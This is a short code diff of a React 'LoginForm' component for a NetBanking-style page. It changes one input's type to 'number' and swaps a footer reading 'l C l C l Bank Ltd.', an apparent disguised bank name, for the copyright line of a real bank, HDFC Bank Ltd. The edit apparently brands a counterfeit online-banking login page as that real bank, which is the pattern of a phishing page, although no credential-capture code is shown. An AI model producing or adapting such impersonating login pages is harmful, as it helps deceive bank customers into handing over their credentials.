@@ -39,7 +39,7 @@ const LoginForm = ({ setIsLoggedIn }) => {
         <input
           className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
           id="name"
-          type="text"
+          type="number"
           value={name}
           onChange={handleNameChange}
           required
@@ -83,7 +83,7 @@ const LoginForm = ({ setIsLoggedIn }) => {
       </div>
     </form>
     <img src={bottom1} alt="NetBanking" className="w-1/3  mt-4" />
-    <p className='text-white text-sm bg-blue-700 p-2'>© Copyright l C l C l Bank Ltd. Terms and Conditions Privacy Policy</p>
+    <p className='text-white text-sm bg-blue-700 p-2'>© Copyright HDFC Bank Ltd. Terms and Conditions Privacy Policy</p>
     </div>
    
   );
